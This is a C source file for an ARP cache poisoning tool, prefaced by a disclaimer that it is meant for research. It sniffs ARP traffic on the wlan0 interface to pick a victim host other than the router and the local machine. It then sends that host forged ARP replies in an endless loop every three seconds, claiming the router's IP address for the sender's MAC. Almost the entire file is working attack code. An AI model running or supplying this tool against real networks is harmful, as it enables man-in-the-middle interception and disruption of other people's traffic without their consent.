/*I'm not responsable of the use of this code , it's made for research purposes .
So please don't use this code to do bad things ;)*/

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset(), and memcpy()

#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <sys/ioctl.h>        // macro ioctl is defined
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>
#include <math.h>

#define DEFAULT_DNS_IP "8.8.8.8"
#define DEFAULT_DNS_PORT 53

struct ethernet{
    uint8_t m_des[6] ;
    uint8_t m_eme[6] ;
    uint16_t type ;
};

struct ARP{
    uint16_t ht ;
    uint16_t pt ;
    uint8_t hal ;
    uint8_t pal ;
    uint16_t opcode ;
    uint8_t m_em[6] ;
    uint8_t i_em[4] ;
    uint8_t m_dest[6] ;
    uint8_t i_dest[4] ;
};

int send_arp(uint8_t mem[] , uint8_t iem[] , uint8_t mdest[] , uint8_t idest[]) ;
void atom(char buffer[] , uint8_t mac[]) ;
void atoip(char buffer[] , uint8_t mac[]) ;
void Getlocalip(uint8_t ip[]) ;
void Getmac(uint8_t mac[]) ;
void traitement(char buffer[]) ;
void Getexternal(uint8_t ip[] , uint8_t mac[] ,uint8_t ip_rooter[] , uint8_t mon_ip[]) ;
int comparaison(uint8_t a[] , uint8_t b[]) ;

int main()
{
    uint8_t mem[6] , iem[4] , mdest[6] , idest[4] , mon_ip[4] ;
    Getlocalip(iem) ;
    Getmac(mem) ;
    memcpy(mon_ip , iem , 4 * sizeof(uint8_t)) ;
    iem[3] = 1 ;
    Getexternal(idest , mdest , iem , mon_ip) ;
    printf("Adresse ip : ") ;
    for(int i = 0 ; i < 4 ; i++){
        printf("%d" , idest[i]) ;
        if(i != 3){
            printf(".") ;
        }
    }
    printf("\nAdresse Mac : ") ;
    for(int x = 0 ; x < 6 ; x++){
        printf("%x" , mdest[x]) ;
        if(x != 5){
            printf(":") ;
        }
    }
    printf("\n") ;
    send_arp( mem , iem , mdest , idest ) ;
    return 0;
}

void Getexternal(uint8_t ip[] , uint8_t mac[] ,uint8_t ip_rooter[] , uint8_t mon_ip[]){
    uint8_t ip_debut[4] = {0} ;
    int d = 1 ;
    struct ethernet eth ;
    memset(&eth , 0 , sizeof(struct ethernet)) ;
    struct ARP arp ;
    memset(&arp , 0 , sizeof(struct ARP)) ;
    int sd = 0 ;
    char ether_frame[65536] = {0} ;
    sd = socket(PF_PACKET, SOCK_RAW , htons(ETH_P_ALL)) ;
    while(d){
    if(d){
        memset(&eth , 0 , sizeof(struct ethernet)) ;
        memset(&arp , 0 , sizeof(struct ARP)) ;
        memset(ether_frame , 0 , sizeof(ether_frame)) ;
        recv(sd, ether_frame, 65536 , 0) ;
        memcpy(&eth , ether_frame , sizeof(struct ethernet)) ;
        if(eth.type == htons(0x0806)){
            memcpy(&arp , ether_frame + sizeof(struct ethernet) , sizeof(struct ARP)) ;
            if(!(comparaison(ip_rooter , arp.i_em)) && !(comparaison(arp.i_em , mon_ip)) && !(comparaison(arp.i_em , ip_debut))){
                memcpy(ip , arp.i_em , 4 * sizeof(uint8_t)) ;
                memcpy(mac , arp.m_em , 6 * sizeof(uint8_t)) ;
                d = 0 ;
            }
        }
    }
    }
}

int comparaison(uint8_t a[] , uint8_t b[]){
    int x = 0 ;
    for(int i = 0 ; i < 4 ; i++){
        if(a[i] == b[i]){
            x++ ;
        }
    }
    if(x == 4){
        return 1 ;
    }else{
        return 0 ;
    }
}

void traitement(char buffer[]){
    int i = 0 ;
    while(buffer[i] != '\n'){
        if(buffer[i] != '\n'){
            i++ ;
        }
    }
    buffer[i] = '\0' ;
}

void Getmac(uint8_t mac[]){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, "wlan0");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for(int c = 0 ; c < 6 ; c++ ){
            mac[c] = s.ifr_addr.sa_data[c] ;
        }
    }
}

void Getlocalip(uint8_t ip[]) {

	struct sockaddr_in server_address;
	struct sockaddr_in local_address;
	int sock_fd = 0, pton_ret, sock_name_no;
	char server_ip[8096] = DEFAULT_DNS_IP;
	uint16_t server_port = DEFAULT_DNS_PORT;
	socklen_t len;

	// fill up server address structure
	memset((void *) &server_address, 0, sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(server_port);
	pton_ret = inet_pton(AF_INET, server_ip, &server_address.sin_addr);

	if (pton_ret <= 0)
		printf("inet_pton() failed");

	if ((sock_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		printf("socket() failed");
	}

	if (connect(sock_fd, (struct sockaddr *) &server_address,
			sizeof(server_address)) == -1) {
		printf("connect() failed");
	}
	len = sizeof(local_address);
	sock_name_no = getsockname(sock_fd, (struct sockaddr *) &local_address,
			&len);
	if (sock_name_no < 0)
		printf("getsockname() error");

    atoip(inet_ntoa(local_address.sin_addr) , ip) ;
}

void atoip(char buffer[] , uint8_t ip[]){
    int a = 0 , b = 0 , c = 0 , d = 0 ;
    char n[4] = {0} ;
    while(a != 4){
        if(a != 4){
            b = 0 ;
            while(b != 4){
                if(b != 4){
                    n[b] = 0 ;
                    b++ ;
                }
            }
            d = 0 ;
            b = 1 ;
            while(b){
                if(b){
                if(buffer[c] != '.' && buffer[c] != '\0'){
                    n[d] = buffer[c] ;
                }
                else{
                    n[d] = '\0' ;
                    b = 0 ;
                }
                c++ ;
                d++ ;
                }
            }
            ip[a] = atoi(n) ;
            a++ ;
        }
    }
}

void atom(char buffer[] , uint8_t mac[]){
    int a = 0 , b = 0 , c = 0 , d = 1 , e = 0 ;
    char ok[2] = {0};
    char n[3] = {0} ;
    while(c != 6){
        if(c != 6){
        d = 0 ;
        while(d != 4){
            if(d != 4){
                n[d] = 0 ;
                d++ ;
            }
        }
        d = 1 ;
        b = 0 ;
        while(d){
            if(d){
            if(buffer[a] != ':' && buffer[a] != '\0'){
                n[b] = buffer[a] ;
            }
            else{
                n[b] = '\0' ;
                d = 0 ;
            }
            a++ ;
            b++ ;
            }
        }
        e = 0 ;
        while(e != 2){
            if(e != 2){
            if(n[e] == 'a'){
                mac[c] += 10 * pow(16, 1-e) ;
            }
            else if(n[e] == 'b'){
                mac[c] += 11 * pow(16, 1-e);
            }
            else if(n[e] == 'c'){
                mac[c] += 12 * pow(16, 1-e);
            }
            else if(n[e] == 'd'){
                mac[c] += 13 * pow(16, 1-e);
            }
            else if(n[e] == 'e'){
                mac[c] += 14 * pow(16, 1-e);
            }
            else if(n[e] == 'f'){
                mac[c] += 15 * pow(16, 1-e);
            }
            else{
                ok[0] = n[e] ;
                ok[1] = '\0' ;
                mac[c] += atoi(ok) * pow(16, 1-e);
            }
            e++ ;
            }
        }
        c++ ;
        }
    }
}

int send_arp(uint8_t mem[] , uint8_t iem[] , uint8_t mdest[] , uint8_t idest[]){
    int sd ;
    struct ethernet eth ;
    memcpy(eth.m_des , mdest , 6 * sizeof(uint8_t)) ;
    memcpy(eth.m_eme , mem , 6 * sizeof(uint8_t)) ;
    eth.type = htons(0x0806) ;
    struct ARP arp ;
    arp.ht = htons(1) ;
    arp.pt = htons(0x0800) ;
    arp.hal = 6 ;
    arp.pal = 4 ;
    arp.opcode = htons(2) ;
    memcpy(arp.m_em , mem , 6 * sizeof(uint8_t)) ;
    memcpy(arp.i_em , iem , 4 * sizeof(uint8_t)) ;
    memcpy(arp.m_dest , mdest , 6 * sizeof(uint8_t)) ;
    memcpy(arp.i_dest , idest , 4 * sizeof(uint8_t)) ;
    uint8_t buffer[43] = {0} ;
    memcpy(buffer , &eth , sizeof(struct ethernet)) ;
    memcpy(buffer+sizeof(struct ethernet) , &arp , sizeof(struct ARP)) ;
    if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
        printf("socket() failed ");
        return 0;
    }
    struct ifreq ifreq_i;
    memset(&ifreq_i,0,sizeof(ifreq_i));
    strncpy(ifreq_i.ifr_name,"wlan0",IFNAMSIZ-1); //giving name of Interface

    if((ioctl(sd ,SIOCGIFINDEX,&ifreq_i))<0){
        printf("error in index ioctl reading");
    }
    struct sockaddr_ll device;
    memset (&device, 0, sizeof (device));
    device.sll_ifindex = ifreq_i.ifr_ifindex;
    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, mdest , 6 * sizeof (uint8_t));
    device.sll_halen = 6;

    // Send ethernet frame to socket.
    int i = 1 ;
    while(1){
    sendto (sd, buffer , 42 , 0, (struct sockaddr *) &device, sizeof (device)) ;
    printf("arp reply done ... i = %d\n" , i) ;
    sleep(3) ;
    i++ ;
    }
}
